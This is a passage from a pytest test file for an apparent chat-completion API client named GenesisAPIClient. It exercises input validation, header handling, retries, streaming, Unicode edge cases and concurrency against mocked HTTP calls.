        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_stream_with_bad_json()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            chunks = []
            try:
                async for chunk in client.create_chat_completion_stream(
                    messages=sample_messages,
                    model_config=sample_model_config
                ):
                    chunks.append(chunk)
            except GenesisAPIError:
                pass  # Expected to handle malformed JSON gracefully
            
            # Should have processed at least the first valid chunk
            assert len(chunks) >= 1

    def test_validate_messages_with_mixed_invalid_roles(self, client):
        """Test message validation with a mix of valid and invalid roles."""
        mixed_messages = [
            ChatMessage(role="user", content="Valid message"),
            ChatMessage(role="invalid_role", content="Invalid role"),
            ChatMessage(role="assistant", content="Another valid message"),
            ChatMessage(role="another_invalid", content="Another invalid")
        ]
        
        with pytest.raises(ValidationError, match="Invalid message role"):
            client._validate_messages(mixed_messages)

    def test_validate_messages_with_whitespace_only_content(self, client):
        """Test message validation with whitespace-only content."""
        whitespace_messages = [
            ChatMessage(role="user", content="   "),  # Only spaces
            ChatMessage(role="user", content="\t\n"),  # Only tabs and newlines
        ]
        
        with pytest.raises(ValidationError, match="Message content cannot be empty"):
            client._validate_messages(whitespace_messages)

    def test_validate_model_config_edge_values(self, client):
        """Test model config validation with boundary values."""
        config = ModelConfig(name="test-model")
        
        # Test exact boundary values
        config.temperature = 0.0  # Minimum valid
        client._validate_model_config(config)
        
        config.temperature = 2.0  # Maximum valid
        client._validate_model_config(config)
        
        config.top_p = 0.0  # Minimum valid
        client._validate_model_config(config)
        
        config.top_p = 1.0  # Maximum valid
        client._validate_model_config(config)
        
        config.max_tokens = 1  # Minimum valid
        client._validate_model_config(config)

    def test_validate_model_config_float_precision(self, client):
        """Test model config validation with high precision float values."""
        config = ModelConfig(name="test-model")
        
        # Test values very close to boundaries
        config.temperature = 0.000001  # Very small but valid
        client._validate_model_config(config)
        
        config.temperature = 1.999999  # Very close to maximum but valid
        client._validate_model_config(config)

    @pytest.mark.asyncio
    async def test_list_models_empty_response(self, client):
        """Test list_models when API returns empty model list."""
        mock_response = {
            'object': 'list',
            'data': []
        }
        
        with patch('aiohttp.ClientSession.get') as mock_get:
            mock_get.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_get.return_value.__aenter__.return_value.status = 200
            
            models = await client.list_models()
            assert len(models) == 0
            assert isinstance(models, list)

    @pytest.mark.asyncio
    async def test_list_models_with_pagination(self, client):
        """Test list_models with paginated response."""
        mock_response = {
            'object': 'list',
            'data': [
                {'id': f'model-{i}', 'object': 'model', 'created': 1677610602}
                for i in range(50)  # Large number of models
            ],
            'has_more': False
        }
        
        with patch('aiohttp.ClientSession.get') as mock_get:
            mock_get.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_get.return_value.__aenter__.return_value.status = 200
            
            models = await client.list_models()
            assert len(models) == 50

    def test_build_headers_preserves_authorization(self, client):
        """Test that custom headers don't override the Authorization header."""
        malicious_headers = {
            'Authorization': 'Bearer fake-key',
            'X-Custom': 'value'
        }
        
        headers = client._build_headers(malicious_headers)
        
        # Should preserve the client's API key, not the custom one
        assert headers['Authorization'] == f'Bearer {client.api_key}'
        assert headers['X-Custom'] == 'value'

    def test_build_headers_case_sensitivity(self, client):
        """Test header building with case-sensitive header names."""
        custom_headers = {
            'content-type': 'text/plain',  # lowercase
            'AUTHORIZATION': 'Bearer fake',  # uppercase
            'X-Custom-Header': 'value'
        }
        
        headers = client._build_headers(custom_headers)
        
        # Should have both the default Content-Type and the custom one
        assert 'Content-Type' in headers
        assert 'content-type' in headers
        assert headers['Content-Type'] == 'application/json'  # Default
        assert headers['content-type'] == 'text/plain'  # Custom

    @pytest.mark.asyncio
    async def test_session_reuse_across_requests(self, client):
        """Test that the same session is reused across multiple requests."""
        mock_response = {
            'id': 'test',
            'object': 'chat.completion',
            'created': int(datetime.now(timezone.utc).timestamp()),
            'model': 'genesis-gpt-4',
            'choices': [{'message': {'role': 'assistant', 'content': 'Test'}}],
            'usage': {'total_tokens': 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            session_before = client.session
            
            await client.create_chat_completion(
                messages=[ChatMessage(role="user", content="Test 1")],
                model_config=ModelConfig(name="test-model")
            )
            
            session_after_first = client.session
            
            await client.create_chat_completion(
                messages=[ChatMessage(role="user", content="Test 2")],
                model_config=ModelConfig(name="test-model")
            )
            
            session_after_second = client.session
            
            # Session should be the same across requests
            assert session_before is session_after_first
            assert session_after_first is session_after_second

    @pytest.mark.asyncio
    async def test_exponential_backoff_timing(self, client, sample_messages, sample_model_config):
        """Test that retry delays follow exponential backoff pattern."""
        delays = []
        
        async def mock_sleep(delay):
            delays.append(delay)
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 500
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={'error': {'message': 'Server error'}}
            )
            
            with patch('asyncio.sleep', side_effect=mock_sleep):
                with pytest.raises(GenesisAPIError):
                    await client.create_chat_completion(
                        messages=sample_messages,
                        model_config=sample_model_config
                    )
                
                # Verify exponential backoff pattern
                assert len(delays) == client.max_retries
                for i in range(1, len(delays)):
                    assert delays[i] > delays[i-1]  # Each delay should be longer


class TestAdvancedDataModels:
    """Extended tests for data model classes with edge cases."""
    
    def test_chat_message_with_none_values(self):
        """Test ChatMessage creation with None values where allowed."""
        message = ChatMessage(role="user", content="Test", name=None)
        assert message.name is None
        
        # Test that None content should be rejected if validation exists
        with pytest.raises((ValueError, TypeError)):
            ChatMessage(role="user", content=None)

    def test_chat_message_serialization(self):
        """Test ChatMessage can be serialized to dict for API requests."""
        message = ChatMessage(role="user", content="Hello", name="John")
        
        # Assuming there's a to_dict method or similar
        if hasattr(message, 'to_dict'):
            data = message.to_dict()
            assert data['role'] == 'user'
            assert data['content'] == 'Hello'
            assert data['name'] == 'John'
        elif hasattr(message, '__dict__'):
            # Fallback to checking attributes
            assert hasattr(message, 'role')
            assert hasattr(message, 'content')
            assert hasattr(message, 'name')

    def test_model_config_with_extreme_values(self):
        """Test ModelConfig with extreme but valid values."""
        config = ModelConfig(
            name="extreme-test",
            max_tokens=1000000,  # Very large
            temperature=0.0,     # Minimum
            top_p=1.0,          # Maximum
            frequency_penalty=2.0,  # Maximum (if supported)
            presence_penalty=-2.0   # Minimum (if supported)
        )
        
        assert config.max_tokens == 1000000
        assert config.temperature == 0.0
        assert config.top_p == 1.0

    def test_api_response_with_empty_data(self):
        """Test APIResponse creation with empty data."""
        response = APIResponse(
            status_code=204,  # No Content
            data={},
            headers={}
        )
        
        assert response.status_code == 204
        assert response.data == {}
        assert response.headers == {}

    def test_chat_completion_with_minimal_data(self):
        """Test ChatCompletion creation with minimal required data."""
        completion = ChatCompletion(
            id="minimal-test",
            object="chat.completion",
            created=0,
            model="test-model",
            choices=[],
            usage={}
        )
        
        assert completion.id == "minimal-test"
        assert len(completion.choices) == 0
        assert completion.usage == {}


class TestAdvancedExceptionHandling:
    """Extended tests for exception handling and error conditions."""
    
    def test_genesis_api_error_with_none_status_code(self):
        """Test GenesisAPIError when status_code is None."""
        error = GenesisAPIError("Error without status code", status_code=None)
        assert str(error) == "Error without status code"
        assert error.status_code is None

    def test_rate_limit_error_with_invalid_retry_after(self):
        """Test RateLimitError with invalid retry_after values."""
        # Test with negative retry_after
        error = RateLimitError("Rate limited", retry_after=-1)
        assert error.retry_after == -1  # Should store as-is
        
        # Test with very large retry_after
        error = RateLimitError("Rate limited", retry_after=999999)
        assert error.retry_after == 999999

    def test_exception_inheritance_chain(self):
        """Test that all custom exceptions inherit correctly."""
        auth_error = AuthenticationError("Auth failed")
        rate_error = RateLimitError("Rate limited")
        validation_error = ValidationError("Validation failed")
        
        # All should inherit from GenesisAPIError
        assert isinstance(auth_error, GenesisAPIError)
        assert isinstance(rate_error, GenesisAPIError)
        assert isinstance(validation_error, GenesisAPIError)
        
        # And ultimately from Exception
        assert isinstance(auth_error, Exception)
        assert isinstance(rate_error, Exception)
        assert isinstance(validation_error, Exception)


class TestAdvancedUtilityFunctions:
    """Extended tests for utility functions with edge cases."""
    
    def test_format_timestamp_edge_cases(self):
        """Test timestamp formatting with edge case values."""
        from app.ai_backend.genesis_api import format_timestamp
        
        # Test with zero timestamp
        formatted = format_timestamp(0)
        assert isinstance(formatted, str)
        
        # Test with very large timestamp
        large_timestamp = 9999999999
        formatted = format_timestamp(large_timestamp)
        assert isinstance(formatted, str)
        
        # Test with negative timestamp (if supported)
        try:
            formatted = format_timestamp(-1)
            assert isinstance(formatted, str)
        except (ValueError, OSError):
            pass  # May not be supported on all systems

    def test_calculate_token_usage_empty_messages(self):
        """Test token usage calculation with empty message list."""
        from app.ai_backend.genesis_api import calculate_token_usage
        
        usage = calculate_token_usage([])
        assert isinstance(usage, dict)
        assert usage.get('estimated_tokens', 0) == 0

    def test_calculate_token_usage_large_messages(self):
        """Test token usage calculation with very large messages."""
        from app.ai_backend.genesis_api import calculate_token_usage
        
        large_messages = [
            ChatMessage(role="user", content="x" * 10000),
            ChatMessage(role="assistant", content="y" * 5000)
        ]
        
        usage = calculate_token_usage(large_messages)
        assert isinstance(usage, dict)
        assert 'estimated_tokens' in usage
        assert usage['estimated_tokens'] > 0

    @pytest.mark.parametrize("content,min_tokens,max_tokens", [
        ("", 0, 1),
        ("x" * 1000, 100, 1500),  # Range for very long text
        ("Hello world! 123 @#$", 2, 10),  # Mixed content
        ("🚀💖🌍", 1, 10),  # Emojis
    ])
    def test_estimate_tokens_ranges(self, content, min_tokens, max_tokens):
        """Test token estimation returns reasonable ranges for various content types."""
        from app.ai_backend.genesis_api import estimate_tokens
        
        tokens = estimate_tokens(content)
        assert min_tokens <= tokens <= max_tokens
        assert isinstance(tokens, int)

    def test_estimate_tokens_consistency(self):
        """Test that token estimation is consistent for the same input."""
        from app.ai_backend.genesis_api import estimate_tokens
        
        content = "This is a test message for consistency checking."
        
        # Call multiple times and ensure consistent results
        results = [estimate_tokens(content) for _ in range(5)]
        assert all(r == results[0] for r in results)


class TestAdvancedIntegration:
    """Extended integration tests for complex workflows."""
    
    @pytest.mark.asyncio
    @pytest.mark.integration
    async def test_full_conversation_simulation(self):
        """Test a complete multi-turn conversation simulation."""
        config = {'api_key': 'test-key'}
        
        conversation_responses = [
            {
                'id': 'conv-1',
                'choices': [{'message': {'role': 'assistant', 'content': 'Hello! How can I help?'}}],
                'usage': {'total_tokens': 15}
            },
            {
                'id': 'conv-2', 
                'choices': [{'message': {'role': 'assistant', 'content': 'I can help with that!'}}],
                'usage': {'total_tokens': 25}
            },
            {
                'id': 'conv-3',
                'choices': [{'message': {'role': 'assistant', 'content': 'Anything else?'}}],
                'usage': {'total_tokens': 35}
            }
        ]
        
        call_count = 0
        
        async def mock_post_conversation(*args, **kwargs):
            nonlocal call_count
            response = Mock()
            response.status = 200
            response.json = AsyncMock(return_value=conversation_responses[call_count])
            call_count += 1
            return response
        
        with patch('aiohttp.ClientSession.post', side_effect=mock_post_conversation):
            async with GenesisAPIClient(**config) as client:
                conversation = []
                
                # Turn 1
                conversation.append(ChatMessage(role="user", content="Hello"))
                result1 = await client.create_chat_completion(
                    messages=conversation.copy(),
                    model_config=ModelConfig(name="test-model")
                )
                conversation.append(ChatMessage(
                    role="assistant", 
                    content=result1.choices[0].message.content
                ))
                
                # Turn 2
                conversation.append(ChatMessage(role="user", content="I need help"))
                result2 = await client.create_chat_completion(
                    messages=conversation.copy(),
                    model_config=ModelConfig(name="test-model")
                )
                conversation.append(ChatMessage(
                    role="assistant",
                    content=result2.choices[0].message.content
                ))
                
                # Turn 3
                conversation.append(ChatMessage(role="user", content="Thanks"))
                result3 = await client.create_chat_completion(
                    messages=conversation.copy(),
                    model_config=ModelConfig(name="test-model")
                )
                
                assert len(conversation) == 5  # 3 user + 2 assistant messages
                assert result1.id == 'conv-1'
                assert result2.id == 'conv-2'
                assert result3.id == 'conv-3'

    @pytest.mark.asyncio
    @pytest.mark.integration
    async def test_streaming_conversation_workflow(self):
        """Test a streaming conversation with multiple chunks per response."""
        config = {'api_key': 'test-key'}
        
        # Simulate streaming chunks for a complete response
        mock_chunks = [
            {'choices': [{'delta': {'role': 'assistant'}}]},
            {'choices': [{'delta': {'content': 'I'}}]},
            {'choices': [{'delta': {'content': ' can'}}]},
            {'choices': [{'delta': {'content': ' help'}}]},
            {'choices': [{'delta': {'content': ' you'}}]},
            {'choices': [{'delta': {'content': ' with'}}]},
            {'choices': [{'delta': {'content': ' that!'}}]},
            {'choices': [{'delta': {}, 'finish_reason': 'stop'}]}
        ]
        
        async def mock_stream():
            for chunk in mock_chunks:
                yield json.dumps(chunk).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            async with GenesisAPIClient(**config) as client:
                full_content = ""
                chunk_count = 0
                
                async for chunk in client.create_chat_completion_stream(
                    messages=[ChatMessage(role="user", content="Help me")],
                    model_config=ModelConfig(name="test-model")
                ):
                    chunk_count += 1
                    if hasattr(chunk.choices[0], 'delta') and hasattr(chunk.choices[0].delta, 'content'):
                        if chunk.choices[0].delta.content:
                            full_content += chunk.choices[0].delta.content
                
                assert chunk_count == len(mock_chunks)
                assert full_content == "I can help you with that!"


class TestAdvancedPerformance:
    """Extended performance and stress tests."""
    
    @pytest.mark.asyncio
    @pytest.mark.performance
    async def test_memory_usage_with_large_responses(self):
        """Test memory efficiency with very large API responses."""
        config = {'api_key': 'test-key'}
        
        # Create a very large mock response
        large_content = "x" * 100000  # 100KB of content
        mock_response = {
            'id': 'large-response-test',
            'choices': [{'message': {'content': large_content}}],
            'usage': {'total_tokens': 25000}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            async with GenesisAPIClient(**config) as client:
                result = await client.create_chat_completion(
                    messages=[ChatMessage(role="user", content="Generate large text")],
                    model_config=ModelConfig(name="test-model", max_tokens=30000)
                )
                
                assert len(result.choices[0].message.content) == 100000
                assert result.usage.total_tokens == 25000

    @pytest.mark.asyncio
    @pytest.mark.performance
    async def test_rapid_sequential_requests(self):
        """Test rapid sequential API requests without concurrency."""
        config = {'api_key': 'test-key'}
        
        mock_response = {
            'id': 'sequential-test',
            'choices': [{'message': {'content': 'Sequential response'}}],
            'usage': {'total_tokens': 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            async with GenesisAPIClient(**config) as client:
                start_time = datetime.now()
                
                results = []
                for i in range(20):  # 20 rapid sequential requests
                    result = await client.create_chat_completion(
                        messages=[ChatMessage(role="user", content=f"Request {i}")],
                        model_config=ModelConfig(name="test-model")
                    )
                    results.append(result)
                
                end_time = datetime.now()
                duration = (end_time - start_time).total_seconds()
                
                assert len(results) == 20
                assert all(r.id == 'sequential-test' for r in results)
                # Verify it completed in reasonable time (adjust threshold as needed)
                assert duration < 10  # Should complete in under 10 seconds

    @pytest.mark.asyncio
    @pytest.mark.performance
    async def test_streaming_performance_with_many_chunks(self):
        """Test streaming performance with a large number of small chunks."""
        config = {'api_key': 'test-key'}
        
        # Generate many small chunks
        mock_chunks = []
        for i in range(1000):  # 1000 small chunks
            mock_chunks.append({'choices': [{'delta': {'content': f'{i}'}}]})
        mock_chunks.append({'choices': [{'delta': {}, 'finish_reason': 'stop'}]})
        
        async def mock_stream():
            for chunk in mock_chunks:
                yield json.dumps(chunk).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            async with GenesisAPIClient(**config) as client:
                start_time = datetime.now()
                
                chunk_count = 0
                async for chunk in client.create_chat_completion_stream(
                    messages=[ChatMessage(role="user", content="Generate many chunks")],
                    model_config=ModelConfig(name="test-model")
                ):
                    chunk_count += 1
                
                end_time = datetime.now()
                duration = (end_time - start_time).total_seconds()
                
                assert chunk_count == 1001  # 1000 content chunks + 1 finish chunk
                # Verify reasonable processing time
                assert duration < 5  # Should process 1000 chunks in under 5 seconds


# Test configuration and framework validation
class TestFrameworkConfiguration:
    """Tests to validate the testing framework and configuration."""
    
    def test_pytest_framework_available(self):
        """Verify that pytest is the testing framework in use."""
        import pytest
        assert pytest.__version__ is not None
        # This test confirms we're using pytest as the testing framework
    
    def test_asyncio_support_available(self):
        """Verify that asyncio testing support is properly configured."""
        import asyncio
        
        # Test that we can create and run async functions
        async def dummy_async():
            await asyncio.sleep(0.001)
            return True
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            result = loop.run_until_complete(dummy_async())
            assert result is True
        finally:
            loop.close()
    
    def test_mock_libraries_available(self):
        """Verify that all required mocking libraries are available."""
        from unittest.mock import Mock, patch, AsyncMock, MagicMock
        
        # Test that we can create different types of mocks
        mock = Mock()
        async_mock = AsyncMock()
        magic_mock = MagicMock()
        
        assert mock is not None
        assert async_mock is not None
        assert magic_mock is not None
        
        # Test basic patching functionality
        with patch('builtins.print') as mock_print:
            print("test")
            mock_print.assert_called_once_with("test")


if __name__ == "__main__":
    # Extended test runner configuration
    pytest.main([
        __file__, 
        "-v", 
        "--tb=short",
        "--maxfail=5",  # Stop after 5 failures
        "--disable-warnings",  # Reduce noise in output
        "-x"  # Stop on first failure for debugging
    ])

# Additional comprehensive test coverage for edge cases and boundary conditions
class TestDeepValidationScenarios:
    """Deep validation tests for complex input scenarios."""
    
    def test_message_validation_with_unicode_normalization(self, client):
        """Test message validation with different Unicode normalization forms."""
        import unicodedata
        
        # Test with different Unicode normalization forms
        content_nfc = unicodedata.normalize('NFC', 'café')
        content_nfd = unicodedata.normalize('NFD', 'café')
        
        messages_nfc = [ChatMessage(role="user", content=content_nfc)]
        messages_nfd = [ChatMessage(role="user", content=content_nfd)]
        
        # Both should be valid
        client._validate_messages(messages_nfc)
        client._validate_messages(messages_nfd)
        
        # Contents should be equivalent but potentially different byte representations
        assert content_nfc == content_nfd  # Should be equivalent
    
    def test_message_validation_with_control_characters(self, client):
        """Test message validation with control characters and special Unicode."""
        # Test with control characters
        control_chars = "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0e\x0f"
        messages_with_control = [ChatMessage(role="user", content=f"Test{control_chars}")]
        
        # Should either strip control characters or raise validation error
        try:
            client._validate_messages(messages_with_control)
        except ValidationError:
            pass  # Acceptable if control characters are rejected
    
    def test_message_validation_with_zero_width_characters(self, client):
        """Test message validation with zero-width characters."""
        zero_width_chars = "\u200b\u200c\u200d\u2060\ufeff"  # Various zero-width characters
        messages = [ChatMessage(role="user", content=f"Test{zero_width_chars}message")]
        
        # Should handle zero-width characters appropriately
        client._validate_messages(messages)
    
    def test_message_validation_with_rtl_and_bidi_text(self, client):
        """Test message validation with right-to-left and bidirectional text."""
        rtl_text = "مرحبا بالعالم"  # Arabic "Hello World"
        bidi_text = "Hello مرحبا World עולם"  # Mixed LTR/RTL
        
        messages = [
            ChatMessage(role="user", content=rtl_text),
            ChatMessage(role="assistant", content=bidi_text)
        ]
        
        client._validate_messages(messages)
    
    def test_model_config_validation_with_infinity_values(self, client):
        """Test model config validation with infinity and NaN values."""
        import math
        
        config = ModelConfig(name="test-model")
        
        # Test with infinity values
        config.temperature = float('inf')
        with pytest.raises(ValidationError):
            client._validate_model_config(config)
        
        config.temperature = float('-inf')
        with pytest.raises(ValidationError):
            client._validate_model_config(config)
        
        # Test with NaN values
        config.temperature = float('nan')
        with pytest.raises(ValidationError):
            client._validate_model_config(config)
        
        config.top_p = float('nan')
        with pytest.raises(ValidationError):
            client._validate_model_config(config)
    
    def test_model_config_validation_with_very_small_values(self, client):
        """Test model config validation with extremely small but positive values."""
        config = ModelConfig(name="test-model")
        
        # Test with very small positive values
        config.temperature = 1e-10
        client._validate_model_config(config)  # Should be valid
        
        config.top_p = 1e-15
        client._validate_model_config(config)  # Should be valid
        
        config.max_tokens = 1
        client._validate_model_config(config)  # Should be valid (minimum)


class TestAdvancedErrorRecovery:
    """Advanced error recovery and resilience tests."""
    
    @pytest.mark.asyncio
    async def test_partial_network_failure_recovery(self, client, sample_messages, sample_model_config):
        """Test recovery from partial network failures during request."""
        import aiohttp
        
        call_count = 0
        
        async def mock_post_with_intermittent_failure(*args, **kwargs):
            nonlocal call_count
            call_count += 1
            
            if call_count == 1:
                # First call: connection error
                raise aiohttp.ClientConnectionError("Connection failed")
            elif call_count == 2:
                # Second call: timeout
                raise asyncio.TimeoutError()
            else:
                # Third call: success
                mock_response = Mock()
                mock_response.status = 200
                mock_response.json = AsyncMock(return_value={
                    'id': 'recovery-success',
                    'choices': [{'message': {'content': 'Recovered successfully'}}],
                    'usage': {'total_tokens': 15}
                })
                return mock_response
        
        with patch('aiohttp.ClientSession.post', side_effect=mock_post_with_intermittent_failure):
            with patch('asyncio.sleep'):  # Speed up test
                result = await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
                
                assert result.id == 'recovery-success'
                assert call_count == 3
    
    @pytest.mark.asyncio
    async def test_graceful_degradation_on_partial_response(self, client, sample_messages, sample_model_config):
        """Test graceful degradation when receiving partial API responses."""
        partial_responses = [
            # First attempt: missing usage field
            {
                'id': 'partial-1',
                'choices': [{'message': {'content': 'Partial response'}}]
                # Missing 'usage' field
            },
            # Second attempt: missing choices field
            {
                'id': 'partial-2',
                'usage': {'total_tokens': 10}
                # Missing 'choices' field
            },
            # Third attempt: complete response
            {
                'id': 'complete-response',
                'choices': [{'message': {'content': 'Complete response'}}],
                'usage': {'total_tokens': 20}
            }
        ]
        
        call_count = 0
        
        async def mock_post_partial_responses(*args, **kwargs):
            nonlocal call_count
            mock_response = Mock()
            mock_response.status = 200
            mock_response.json = AsyncMock(return_value=partial_responses[call_count])
            call_count += 1
            return mock_response
        
        with patch('aiohttp.ClientSession.post', side_effect=mock_post_partial_responses):
            with patch('asyncio.sleep'):
                # Should eventually succeed with complete response
                result = await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
                
                assert result.id == 'complete-response'
    
    @pytest.mark.asyncio
    async def test_circuit_breaker_behavior(self, client, sample_messages, sample_model_config):
        """Test circuit breaker-like behavior with consecutive failures."""
        failure_count = 0
        
        async def mock_post_consecutive_failures(*args, **kwargs):
            nonlocal failure_count
            failure_count += 1
            
            mock_response = Mock()
            mock_response.status = 500
            mock_response.json = AsyncMock(
                return_value={'error': {'message': f'Server error {failure_count}'}}
            )
            return mock_response
        
        with patch('aiohttp.ClientSession.post', side_effect=mock_post_consecutive_failures):
            with patch('asyncio.sleep'):
                # Should fail after max retries
                with pytest.raises(GenesisAPIError):
                    await client.create_chat_completion(
                        messages=sample_messages,
                        model_config=sample_model_config
                    )
                
                # Should have attempted max_retries + 1 times
                assert failure_count == client.max_retries + 1


class TestConcurrencyAndThreadSafety:
    """Tests for concurrency and thread safety scenarios."""
    
    @pytest.mark.asyncio
    async def test_concurrent_requests_with_different_models(self, client):
        """Test concurrent requests using different model configurations."""
        models = ['model-a', 'model-b', 'model-c']
        
        async def make_request(model_name):
            mock_response = {
                'id': f'concurrent-{model_name}',
                'model': model_name,
                'choices': [{'message': {'content': f'Response from {model_name}'}}],
                'usage': {'total_tokens': 10}
            }
            
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
                mock_post.return_value.__aenter__.return_value.status = 200
                
                result = await client.create_chat_completion(
                    messages=[ChatMessage(role="user", content=f"Test {model_name}")],
                    model_config=ModelConfig(name=model_name)
                )
                return result
        
        # Execute concurrent requests
        tasks = [make_request(model) for model in models]
        results = await asyncio.gather(*tasks)
        
        # Verify all requests completed successfully
        assert len(results) == 3
        for i, result in enumerate(results):
            assert result.model == models[i]
            assert result.id == f'concurrent-{models[i]}'
    
    @pytest.mark.asyncio
    async def test_session_sharing_across_concurrent_requests(self, client):
        """Test that session is properly shared across concurrent requests."""
        request_count = 5
        session_ids = []
        
        async def capture_session_id(request_id):
            session_ids.append(id(client.session))
            
            mock_response = {
                'id': f'session-test-{request_id}',
                'choices': [{'message': {'content': f'Response {request_id}'}}],
                'usage': {'total_tokens': 5}
            }
            
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
                mock_post.return_value.__aenter__.return_value.status = 200
                
                return await client.create_chat_completion(
                    messages=[ChatMessage(role="user", content=f"Request {request_id}")],
                    model_config=ModelConfig(name="test-model")
                )
        
        # Execute concurrent requests
        tasks = [capture_session_id(i) for i in range(request_count)]
        results = await asyncio.gather(*tasks)
        
        # All requests should use the same session
        assert len(set(session_ids)) == 1
        assert len(results) == request_count


class TestStreamingAdvancedScenarios:
    """Advanced streaming scenarios and edge cases."""
    
    @pytest.mark.asyncio
    async def test_streaming_with_varying_chunk_sizes(self, client, sample_messages, sample_model_config):
        """Test streaming with chunks of varying sizes."""
        # Create chunks of different sizes
        chunks = [
            {'choices': [{'delta': {'content': 'A'}}]},  # 1 char
            {'choices': [{'delta': {'content': 'This is a medium chunk'}}]},  # Medium
            {'choices': [{'delta': {'content': 'X' * 1000}}]},  # Large chunk
            {'choices': [{'delta': {'content': ''}}]},  # Empty chunk
            {'choices': [{'delta': {'content': 'Final'}}]},  # Final content
            {'choices': [{'delta': {}, 'finish_reason': 'stop'}]}  # End marker
        ]
        
        async def mock_variable_stream():
            for chunk in chunks:
                yield json.dumps(chunk).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_variable_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            received_chunks = []
            full_content = ""
            
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                received_chunks.append(chunk)
                if hasattr(chunk.choices[0], 'delta') and hasattr(chunk.choices[0].delta, 'content'):
                    if chunk.choices[0].delta.content:
                        full_content += chunk.choices[0].delta.content
            
            assert len(received_chunks) == 6
            expected_content = 'A' + 'This is a medium chunk' + 'X' * 1000 + 'Final'
            assert full_content == expected_content
    
    @pytest.mark.asyncio
    async def test_streaming_with_unicode_across_chunk_boundaries(self, client, sample_messages, sample_model_config):
        """Test streaming where Unicode characters are split across chunk boundaries."""
        # Simulate Unicode character split across chunks
        unicode_text = "Hello 🌍 World 🚀 Test"
        
        # Split the Unicode text in a way that might break multi-byte characters
        chunks = []
        for i in range(0, len(unicode_text), 3):  # Small chunks that might split Unicode
            chunk_content = unicode_text[i:i+3]
            chunks.append({'choices': [{'delta': {'content': chunk_content}}]})
        
        chunks.append({'choices': [{'delta': {}, 'finish_reason': 'stop'}]})
        
        async def mock_unicode_stream():
            for chunk in chunks:
                yield json.dumps(chunk, ensure_ascii=False).encode('utf-8')
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_unicode_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            reconstructed_text = ""
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                if hasattr(chunk.choices[0], 'delta') and hasattr(chunk.choices[0].delta, 'content'):
                    if chunk.choices[0].delta.content:
                        reconstructed_text += chunk.choices[0].delta.content
            
            # Should properly reconstruct the Unicode text
            assert reconstructed_text == unicode_text
    
    @pytest.mark.asyncio
    async def test_streaming_with_json_escape_sequences(self, client, sample_messages, sample_model_config):
        """Test streaming with content containing JSON escape sequences."""
        chunks_with_escapes = [
            {'choices': [{'delta': {'content': 'Text with "quotes"'}}]},
            {'choices': [{'delta': {'content': ' and \\backslashes\\'}}]},
            {'choices': [{'delta': {'content': ' and \n newlines'}}]},
            {'choices': [{'delta': {'content': ' and \t tabs'}}]},
            {'choices': [{'delta': {}, 'finish_reason': 'stop'}]}
        ]
        
        async def mock_escape_stream():
            for chunk in chunks_with_escapes:
                yield json.dumps(chunk).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_escape_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            full_content = ""
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                if hasattr(chunk.choices[0], 'delta') and hasattr(chunk.choices[0].delta, 'content'):
                    if chunk.choices[0].delta.content:
                        full_content += chunk.choices[0].delta.content
            
            expected = 'Text with "quotes" and \\backslashes\\ and \n newlines and \t tabs'
            assert full_content == expected


class TestMemoryAndResourceManagement:
    """Tests for memory usage and resource management."""
    
    @pytest.mark.asyncio
    async def test_memory_cleanup_after_large_request(self, client):
        """Test memory cleanup after processing large requests."""
        import gc
        import sys
        
        # Create a very large message
        large_message = "X" * 1000000  # 1MB message
        
        mock_response = {
            'id': 'memory-test',
            'choices': [{'message': {'content': 'Response'}}],
            'usage': {'total_tokens': 250000}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Capture initial memory usage
